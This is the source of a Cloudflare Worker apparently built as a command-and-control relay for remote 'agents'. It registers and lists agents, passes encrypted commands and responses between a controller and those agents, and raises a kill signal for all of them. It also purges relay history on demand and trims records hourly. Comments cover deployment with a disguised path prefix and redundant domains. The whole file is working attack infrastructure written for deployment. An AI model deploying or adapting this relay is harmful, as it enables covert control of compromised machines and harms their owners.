/**
 * c2-worker — Cloudflare Worker relay channel (D1 storage).
 *
 * Deploy (see README.md):
 *   1. wrangler d1 create c2relay            → fill database_id below
 *   2. wrangler secret put C2_AUTH           → the shared secret
 *   3. wrangler deploy
 *   4. (optional) bind a custom domain in the dashboard — the workers.dev
 *      domain keeps working in parallel, giving the two-domain redundancy.
 *
 * Protocol mirrors the GitHub issue-comment channel: payloads stay
 * "<!-- c -->"/"<!-- r -->" + AES-256-GCM base64 envelopes, so both the
 * agent and the controller reuse their existing crypto and watermark logic.
 * All endpoints live under /<PATH_SECRET>/ (set PATH_SECRET below, change it!)
 * and require header  X-C2-Auth: <C2_AUTH secret>.
 */
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    // Random-looking path prefix — change this when deploying!
    const PREFIX = "/" + (env.PATH_SECRET || "status-check") + "/";

    if (!url.pathname.startsWith(PREFIX)) {
      return new Response("Not Found", { status: 404 });
    }
    // 常数时间比较（五轮审计）：普通 !== 按首字节短路，理论上可逐字节探测
    // secret。长度不等直接拒绝（长度泄露可接受——同数量级）。
    if (!_authEqual(request.headers.get("X-C2-Auth") || "", env.C2_AUTH || "")) {
      return new Response("Unauthorized", { status: 401 });
    }

    const db = env.DB;
    const path = url.pathname.slice(PREFIX.length - 1); // keep leading "/"

    // POST /reg        {agent_id, body}            → upsert agent (registration)
    // GET  /agents                                  → discovery list
    // POST /c2d/:id    {body}                      → controller posts command
    // GET  /c2d/:id?since=N                         → controller reads responses
    // POST /d2c/:id    {body, resp_to}             → agent posts response
    // GET  /d2c/:id?since=N                        → agent reads commands
    // POST /kill                                     → kill signal (all agents)
    // GET  /kill                                     → kill signal check
    try {
      if (path === "/reg" && request.method === "POST") {
        const { agent_id, body } = await request.json();
        if (!agent_id || !body) return json({ error: "bad request" }, 400);
        if (typeof agent_id !== "string" || !/^[A-Za-z0-9_-]{1,64}$/.test(agent_id)) {
          return json({ error: "bad agent_id" }, 400);
        }
        await db.prepare(
          "INSERT INTO agents(id, reg_body, first_seen, last_seen) VALUES(?,?,strftime('%Y-%m-%dT%H:%M:%SZ','now'),strftime('%Y-%m-%dT%H:%M:%SZ','now')) " +
          "ON CONFLICT(id) DO UPDATE SET reg_body=excluded.reg_body, last_seen=excluded.last_seen"
        ).bind(agent_id, String(body)).run();
        return json({ ok: true });
      }

      if (path === "/agents" && request.method === "GET") {
        // P2-9: use real column name `last_seen`, not aliased `created_at`
        // (semantically wrong — it's the LAST update time, not first registration)
        const { results } = await db.prepare(
          "SELECT id, reg_body AS body, last_seen FROM agents ORDER BY id"
        ).all();
        return json(results || []);
      }

      if (path === "/kill") {
        if (request.method === "POST") {
          await db.prepare(
            "INSERT INTO kill_flag(k, raised_at) VALUES(1, strftime('%Y-%m-%dT%H:%M:%SZ','now')) " +
            "ON CONFLICT(k) DO UPDATE SET raised_at=strftime('%Y-%m-%dT%H:%M:%SZ','now')"
          ).run();
          return json({ ok: true });
        }
        if (request.method === "DELETE") {   // disarm: close the KILLALL equivalent
          await db.prepare("DELETE FROM kill_flag WHERE k = 1").run();
          return json({ ok: true });
        }
        const row = await db.prepare("SELECT raised_at FROM kill_flag WHERE k=1").first();
        return json({ active: !!row, raised_at: row ? row.raised_at : null });
      }

      // DELETE /comments/:id → purge ALL relay comments for an agent
      // (controller "清空历史"; local DB is authoritative, relay is a buffer)
      const pc = path.match(/^\/comments\/([A-Za-z0-9_\-.]+)$/);
      if (pc && request.method === "DELETE") {
        const out = await db.prepare(
          "DELETE FROM comments WHERE agent_id = ? RETURNING id"
        ).bind(pc[1]).all();
        return json({ ok: true, deleted: out.results ? out.results.length : 0 });
      }

      const m = path.match(/^\/(c2d|d2c)\/([A-Za-z0-9_-]+)$/);
      if (!m) return json({ error: "not found" }, 404);
      const [, dir, agentId] = m;
      const mine = dir === "c2d" ? "c" : "r";   // writer's side: c=controller cmd
      const read = dir === "c2d" ? "r" : "c";   // reader reads the opposite side

      if (request.method === "POST") {
        const { body, resp_to } = await request.json();
        if (!body) return json({ error: "bad request" }, 400);
        const out = await db.prepare(
          "INSERT INTO comments(agent_id, direction, resp_to, body, created_at) VALUES(?,?,?,?,strftime('%Y-%m-%dT%H:%M:%SZ','now')) RETURNING id"
        ).bind(agentId, mine, resp_to ? String(resp_to) : null, String(body)).first();
        return json({ ok: true, id: out ? out.id : null });
      }

      const since = parseInt(url.searchParams.get("since") || "0", 10) || 0;
      const { results } = await db.prepare(
        "SELECT id, body, resp_to, created_at FROM comments " +
        "WHERE agent_id = ? AND direction = ? AND id > ? ORDER BY id ASC LIMIT 200"
      ).bind(agentId, read, since).all();
      return json({ comments: results || [], last: results && results.length ? results[results.length - 1].id : since });
    } catch (e) {
      return json({ error: String(e) }, 500);
    }
  },
};

function _authEqual(a, b) {
  const ea = new TextEncoder().encode(String(a));
  const eb = new TextEncoder().encode(String(b));
  if (ea.length !== eb.length || ea.length === 0) return false;
  let d = 0;
  for (let i = 0; i < ea.length; i++) d |= ea[i] ^ eb[i];
  return d === 0;
}

function json(obj, status = 200) {
  return new Response(JSON.stringify(obj), {
    status,
    headers: { "Content-Type": "application/json" }, // P2-10: no CORS — machine-to-machine only
  });
}

/**
 * Hourly cron: keep newest 100 comments per agent per direction, drop agents
 * unseen 14d. The controller stores every message locally — the relay only
 * needs enough rows for live agents' watermarks, so trim aggressively.
 */
export async function scheduled(event, env) {
  const db = env.DB;
  await db.prepare(
    "DELETE FROM comments WHERE id IN (" +
    "  SELECT id FROM comments c WHERE (" +
    "    SELECT COUNT(*) FROM comments n WHERE n.agent_id = c.agent_id" +
    "      AND n.direction = c.direction AND n.id > c.id" +
    "  ) >= 100)"
  ).run();
  await db.prepare(
    "DELETE FROM agents WHERE last_seen < datetime('now', '-14 days')"
  ).run();
}
